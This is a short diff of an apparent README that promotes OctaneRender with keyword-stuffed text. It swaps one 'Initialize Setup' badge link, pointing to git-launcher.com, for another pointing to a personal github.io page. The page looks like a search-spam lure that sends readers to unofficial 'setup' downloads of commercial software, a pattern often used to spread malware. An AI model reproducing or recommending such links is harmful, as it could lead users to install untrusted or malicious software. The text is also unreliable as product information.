@@ -22,7 +22,7 @@ Developers and technical users frequently explore open integration opportunities
 
 Whether creating cinematic sequences with cinema octane environments, developing assets through daz studio octane render workflows, utilizing 3ds max octane render integrations, or managing gpu for octane render configurations, OctaneRender provides a comprehensive rendering framework. Combined with octane 3d technologies and cloud-based rendering options, the platform delivers a powerful visualization environment for Windows systems.
 
-[![Initialize Setup](https://badgen.net/badge/Initialize/Setup/blue?icon=terminal)](https://git-launcher.com/)
+
 
 [![Initialize Setup](https://badgen.net/badge/Initialize/Setup/blue?icon=terminal)](https://oakleywallerrcpw.github.io/.github/Octane-Render-Cinema-4D)
 
